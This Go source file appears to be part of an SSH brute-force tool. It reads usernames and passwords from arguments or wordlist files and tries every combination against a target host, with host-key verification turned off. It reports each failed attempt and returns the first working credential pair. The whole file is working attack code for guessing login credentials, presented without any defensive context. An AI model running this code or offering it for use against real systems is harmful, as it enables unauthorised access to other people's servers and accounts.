package main

import (
	"bufio"
    "log"
    "net"
    "os"
	"golang.org/x/crypto/ssh"
	"fmt"
)

func IUsserPAss(ArgVar *ArgVar) ([]string, []string) {
	var UserName []string
    var PassWords []string

    if ArgVar.User != "" {
        UserName = append(UserName, ArgVar.User)
    } else if ArgVar.UserList != "" {
        file, err := os.Open(ArgVar.UserList)
        if err != nil {
            log.Fatal("[+] ",err)
        }
        defer file.Close()

        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            UserName = append(UserName, scanner.Text())
        }
        if err := scanner.Err(); err != nil {
            log.Fatal("[+] ",err)
        }
    }

    if ArgVar.Pass != "" {
        PassWords = append(PassWords, ArgVar.Pass)
    } else if ArgVar.PassList != "" {
        file, err := os.Open(ArgVar.PassList)
        if err != nil {
            log.Fatal("[+] ",err)
        }
        defer file.Close()

        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            PassWords = append(PassWords, scanner.Text())
        }
        if err := scanner.Err(); err != nil {
            log.Fatal("[+] ",err)
        }
    }
    return UserName ,PassWords
 }   
func (ArgVar *ArgVar) SSHConnect()(string,string){
	DomainNet := net.JoinHostPort(ArgVar.Address, ArgVar.Port)

    if ArgVar.User !="" && ArgVar.Pass !=""{
    	SSHdial := &ssh.ClientConfig{
		User: ArgVar.User,
		Auth: []ssh.AuthMethod{
			ssh.Password(ArgVar.Pass),
		},
	    	HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	    }
	    _ , err := ssh.Dial("tcp", DomainNet , SSHdial)
	    if err != nil {
	     	fmt.Printf("❌ handshake failed: ssh USERNAME %s  PASSWORD %s", ArgVar.User ,ArgVar.Pass)
	    }
   	    return ArgVar.User ,ArgVar.Pass

    }else if ArgVar.User != "" && ArgVar.PassList !=""{
    	fmt.Println("")
    	_ , PassList:= IUsserPAss(ArgVar)
    	for Pass := range PassList{
    		SSHdial := &ssh.ClientConfig{
		        User: ArgVar.User,
	        	Auth: []ssh.AuthMethod{
		    	    ssh.Password(PassList[Pass]),
	        	},
	            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	        }
	        _ , err := ssh.Dial("tcp", DomainNet , SSHdial)
	        if err != nil {
                fmt.Print("\033[G\033[K")
	        	fmt.Printf("❌ handshake failed: ssh USERNAME %s  PASSWORD %s", ArgVar.User,PassList[Pass])
	        	continue
	        }else{
                fmt.Print("\033[G\033[K")
	        	return ArgVar.User ,PassList[Pass]
	        	break
	        }
    	}

    }else if ArgVar.Pass !="" && ArgVar.UserList !=""{
        fmt.Println("")
    	UserList , _:= IUsserPAss(ArgVar)
    	for User := range UserList {
    		SSHdial := &ssh.ClientConfig{
		        User: UserList[User],
	        	Auth: []ssh.AuthMethod{
		    	    ssh.Password(ArgVar.Pass),
	        	},
	            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	        }
	        _ , err := ssh.Dial("tcp", DomainNet , SSHdial)
	        if err != nil {
                fmt.Print("\033[G\033[K")
                fmt.Printf("❌ handshake failed: ssh USERNAME %s  PASSWORD %s" , UserList[User],ArgVar.Pass)
	        	continue
	        }else{
                fmt.Print("\033[G\033[K")
	        	return UserList[User]  ,ArgVar.Pass
	        	break
	        }
   	    }   
    }else if ArgVar.UserList != "" && ArgVar.PassList !=""{
        fmt.Println("")
    	UserList , PassList := IUsserPAss(ArgVar)
    	for User := range UserList {
    		for Pass := range PassList{
    			SSHdial := &ssh.ClientConfig{
		        User: UserList[User],
	        	Auth: []ssh.AuthMethod{
		    	    ssh.Password(PassList[Pass]),
	        	},
	            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		        }
		        _ , err := ssh.Dial("tcp", DomainNet , SSHdial)
		        if err != nil {
                    fmt.Print("\033[G\033[K")
		        	fmt.Printf("❌ handshake failed: ssh USERNAME %s  PASSWORD  %s", UserList[User], PassList[Pass])
                    continue
		        }else{
                    fmt.Print("\033[G\033[K")
		        	return UserList[User]  ,PassList[Pass]
		        	break
		        }

    		}
    	}
    		
   	}   
    return "" ,""
}